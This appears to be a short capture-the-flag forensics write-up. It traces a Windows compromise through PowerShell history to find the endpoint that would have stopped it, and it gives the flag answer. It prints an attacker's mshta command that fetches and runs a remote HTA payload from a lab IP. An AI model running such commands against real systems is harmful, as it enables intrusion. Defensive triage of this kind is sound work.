

During triage, we needed to identify **which single network endpoint**, if blocked, would have prevented the entire compromise.

### **Step 1 — Search for any suspicious network usage**

Attacker activity in Windows often leaves traces in PowerShell history. I searched through all user PSReadLine logs:

`grep -RiE "http|https|tcp|:443|:80" ./Users/*/AppData/Roaming/Microsoft/Windows/PowerShell/PSReadline/ConsoleHost_history.txt`

### **Step 2 — Identify the malicious execution**

The output showed a clear smoking gun under the user _jowi_:

`mshta.exe http://192.168.56.106:8080/1oTEe1jjDf.hta`

### **Why this matters**

- **mshta.exe** is a known LOLBin used for remote script execution.
    
- It's fetching an **.hta** file from a remote machine.
    
- That remote host is almost certainly the attacker's C2 / payload server.
    
- Blocking this IP:Port would have cut the initial infection vector before anything else could execute.
    

### **Step 3 — Confirm no other endpoints matter more**

Other URLs in the logs (GitHub, Atera cloud) were either:

- legitimate tooling
    
- or secondary activity **after** compromise
    

But the **very first malicious entry point** was the mshta call.

### **Kill Switch**

The endpoint that should have been blocked:

`r00t{192.168.56.106:8080}`

### **Conclusion**

The compromise hinged entirely on access to the attacker’s HTA payload server. Firewalling **192.168.56.106:8080** would have stopped the attack in its earliest phase — before persistence, lateral movement, or remote tools could launch.